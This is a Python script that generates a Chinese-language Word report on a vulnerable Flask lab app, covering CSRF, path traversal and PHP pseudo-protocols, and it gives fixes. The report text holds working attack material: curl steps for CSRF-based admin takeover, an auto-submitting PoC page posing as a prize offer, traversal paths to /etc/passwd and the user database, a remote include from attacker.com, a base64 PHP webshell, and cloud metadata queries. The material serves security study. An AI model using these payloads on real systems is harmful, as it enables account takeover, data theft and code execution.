#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""今日学习内容：CSRF + 文件包含/路径穿越 + 伪协议 漏洞分析报告"""
import os
from docx import Document
from docx.shared import Pt, RGBColor
from docx.enum.text import WD_ALIGN_PARAGRAPH
from docx.enum.table import WD_TABLE_ALIGNMENT
from docx.oxml.ns import qn, nsdecls
from docx.oxml import parse_xml

doc = Document()

style = doc.styles['Normal']
style.font.name = 'Microsoft YaHei'
style.font.size = Pt(11)
style.element.rPr.rFonts.set(qn('w:eastAsia'), 'Microsoft YaHei')
for i in range(1,5):
    hs = doc.styles[f'Heading {i}']
    hs.font.name = 'Microsoft YaHei'
    hs.element.rPr.rFonts.set(qn('w:eastAsia'), 'Microsoft YaHei')

def shade(c, color):
    s = parse_xml(f'<w:shd {nsdecls("w")} w:fill="{color}" w:val="clear"/>')
    c._tc.get_or_add_tcPr().append(s)

def tbl(doc, data):
    t = doc.add_table(rows=len(data), cols=len(data[0]), style='Light Grid Accent 1')
    t.alignment = WD_TABLE_ALIGNMENT.CENTER
    for i, rd in enumerate(data):
        for j, ct in enumerate(rd):
            t.rows[i].cells[j].text = ct
            for p in t.rows[i].cells[j].paragraphs:
                p.alignment = WD_ALIGN_PARAGRAPH.CENTER
                for r in p.runs: r.font.size = Pt(10)
            if i==0:
                shade(t.rows[i].cells[j], "1A237E")
                for p in t.rows[i].cells[j].paragraphs:
                    for r in p.runs: r.font.color.rgb = RGBColor(0xFF,0xFF,0xFF)
    return t

def code(doc, text, green=False):
    p = doc.add_paragraph()
    p.paragraph_format.space_before = Pt(3)
    p.paragraph_format.space_after = Pt(3)
    fill = "E8F5E9" if green else "FFEBEE"
    s = parse_xml(f'<w:shd {nsdecls("w")} w:fill="{fill}" w:val="clear"/>')
    p.paragraph_format.element.get_or_add_pPr().append(s)
    r = p.add_run(text)
    r.font.name = 'Courier New'
    r.font.size = Pt(9)
    return p

# ===== 封面 =====
for _ in range(4): doc.add_paragraph("")
t = doc.add_paragraph(); t.alignment = WD_ALIGN_PARAGRAPH.CENTER
r = t.add_run("今日学习内容漏洞分析报告"); r.font.size = Pt(24); r.bold = True
r.font.color.rgb = RGBColor(0x1a,0x1a,0x2e)
doc.add_paragraph("")
s = doc.add_paragraph(); s.alignment = WD_ALIGN_PARAGRAPH.CENTER
r = s.add_run("CSRF + 文件包含/路径穿越 + 伪协议"); r.font.size = Pt(14)
for _ in range(3): doc.add_paragraph("")
i = doc.add_paragraph(); i.alignment = WD_ALIGN_PARAGRAPH.CENTER
r = i.add_run("实验日期：2026年7月"); r.font.size = Pt(12)
doc.add_page_break()

doc.add_heading("目  录", level=1)
for i,c in enumerate(["CSRF跨站请求伪造漏洞（/change-password）","文件包含与路径穿越漏洞（/page）",
    "伪协议知识（HTTP/data/php）","漏洞代码分析","修复方案（含完整代码）","修复前后代码对比"],1):
    p = doc.add_paragraph(f"第{i}章  {c}")
    p.paragraph_format.space_after = Pt(6); p.runs[0].font.size = Pt(12)
doc.add_page_break()

# 第一章
doc.add_heading("第一章  CSRF跨站请求伪造漏洞（/change-password）", level=1)
doc.add_heading("1.1 漏洞概述", level=2)
doc.add_paragraph("CSRF攻击诱导已登录用户访问恶意页面，利用用户登录状态执行非授权操作。漏洞点在POST /change-password。")

doc.add_heading("1.2 攻击链（4步）", level=2)
code(doc, "alice登录 → CSRF改admin密码 → 新密码登录admin → 越权删用户carlos")
doc.add_paragraph("")
doc.add_paragraph("Step1：alice登录获取Cookie")
code(doc, "curl -c /tmp/c.txt -X POST http://target/login -d 'username=alice&password=alice2025'")
doc.add_paragraph("Step2：CSRF修改admin密码")
code(doc, "curl -b /tmp/c.txt -X POST http://target/change-password -d 'username=admin&new_password=hacked123'")
doc.add_paragraph("Step3：用新密码登录admin")
code(doc, "curl -c /tmp/a.txt -X POST http://target/login -d 'username=admin&password=hacked123'")
doc.add_paragraph("Step4：越权删除用户")
code(doc, "curl -b /tmp/a.txt -X POST http://target/admin/delete-user -d 'user_id=2'")

doc.add_heading("1.3 Burp Suite CSRF PoC生成", level=2)
doc.add_paragraph("拦截POST /change-password → 右键 → Generate CSRF PoC → 保存HTML")
code(doc,
    '<html><body>\n'
    '<h1>免费抽奖！点击领取</h1>\n'
    '<form action="http://target:5000/change-password" method="POST">\n'
    '  <input type="hidden" name="username" value="admin">\n'
    '  <input type="hidden" name="new_password" value="hacked123">\n'
    '</form>\n'
    '<script>document.forms[0].submit();</script>\n'
    '</body></html>')

# 第二章
doc.add_heading("第二章  文件包含与路径穿越漏洞（/page）", level=1)
doc.add_paragraph("漏洞路由：GET /page?name=参数，name直接拼接到文件路径，未过滤../")
code(doc,
    "读取源码：     /page?name=../app.py\n"
    "下载数据库：   /page?name=../data/users.db\n"
    "读系统文件：   /page?name=../../../../../../etc/passwd")

# 第三章
doc.add_heading("第三章  伪协议知识", level=1)
doc.add_heading("3.1 HTTP伪协议 → 内网扫描", level=2)
doc.add_paragraph("利用文件包含请求远程URL，实现SSRF攻击和内网探测。")
code(doc,
    "# PHP远程文件包含\n"
    "include('http://attacker.com/shell.txt')\n\n"
    "# Python内网扫描\n"
    "for i in range(1,255):\n"
    "    r = requests.get(f'http://192.168.1.{i}:80', timeout=1)\n\n"
    "# AWS元数据\n"
    "curl http://169.254.169.254/latest/meta-data/local-ipv4\n\n"
    "# 阿里云元数据\n"
    "curl http://100.100.100.200/latest/meta-data/")

doc.add_heading("3.2 data伪协议 → 代码执行", level=2)
code(doc, "# PHP: include('data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUW2NtZF0pOyA/Pg==')")

doc.add_heading("3.3 php://伪协议 → 读取源码", level=2)
code(doc, "# php://filter/read=convert.base64-encode/resource=config.php\n# php://input + POST body执行代码")

# 第四章
doc.add_heading("第四章  漏洞代码分析", level=1)
doc.add_heading("4.1 /change-password漏洞代码", level=2)
code(doc,
    '@app.route("/change-password", methods=["POST"])\n'
    'def change_password():\n'
    '    username = request.form.get("username", "")\n'
    '    new_password = request.form.get("new_password", "")\n'
    '    # ⚠️ 无CSRF Token / 无原密码 / 越权改密 / 无Referer\n'
    '    # ⚠️ SQL注入 + 明文存储\n'
    '    sql = f"UPDATE users SET password = \'{new_password}\' WHERE username = \'{username}\'"\n'
    '    c.execute(sql); conn.commit()')

doc.add_heading("4.2 /page漏洞代码", level=2)
code(doc,
    '@app.route("/page", methods=["GET"])\n'
    'def page():\n'
    '    name = request.args.get("name", "")\n'
    '    # ⚠️ 直接拼接路径，未过滤..\n'
    '    file_path = os.path.join("pages", name)\n'
    '    with open(file_path, "r") as f: page_content = f.read()')

# 第五章
doc.add_heading("第五章  修复方案", level=1)
doc.add_heading("5.1 CSRF修复（三重防护）", level=2)
code(doc,
    '# 修复1：CSRF Token\n'
    'session["csrf_token"] = uuid.uuid4().hex\n'
    'if token != session.get("csrf_token", ""): return "CSRF验证失败"\n\n'
    '# 修复2：Session绑定\n'
    'if username != session["username"]: return "无权修改他人密码"\n\n'
    '# 修复3：Referer验证\n'
    'if not referer.startswith(request.host_url): return "请求来源不合法"', green=True)

doc.add_heading("5.2 文件包含修复（三重防护）", level=2)
code(doc,
    '# 修复1：白名单\n'
    'ALLOWED_PAGES = {"help", "about", "faq"}\n'
    'if name not in ALLOWED_PAGES: return "页面不存在"\n\n'
    '# 修复2：过滤..符号\n'
    'if ".." in name: return "页面不存在"\n\n'
    '# 修复3：路径规范化\n'
    'base = os.path.abspath("pages")\n'
    'req = os.path.abspath(os.path.join("pages", name))\n'
    'if not req.startswith(base): return "页面不存在"', green=True)

# 第六章
doc.add_heading("第六章  修复前后代码对比", level=1)
tbl(doc, [("对比项","有漏洞(app.py)","已修复(app_fixed.py)"),
    ("CSRF Token","❌ 无","✅ uuid+Session校验"),
    ("越权改密","❌ 可改任何人","✅ 只能改自己的密码"),
    ("Referer验证","❌ 无","✅ 验证Referer"),
    ("SQL注入","❌ 字符串拼接","✅ 参数化查询"),
    ("密码存储","❌ 明文","✅ SHA256哈希"),
    ("路径过滤","❌ 无","✅ 过滤..符号"),
    ("白名单","❌ 无限制","✅ 白名单校验"),
    ("路径校验","❌ 无","✅ os.path.abspath校验")])

doc.add_paragraph("")
p = doc.add_paragraph(); p.alignment = WD_ALIGN_PARAGRAPH.CENTER
r = p.add_run("—— 报告结束 ——"); r.font.color.rgb = RGBColor(0x99,0x99,0x99); r.font.size = Pt(12)

out = "/root/flask-app-vuln/static/今日学习内容漏洞分析报告.docx"
doc.save(out)
print(f"✅ 报告已生成：{out}")
print(f"   大小：{os.path.getsize(out)/1024:.1f}KB")
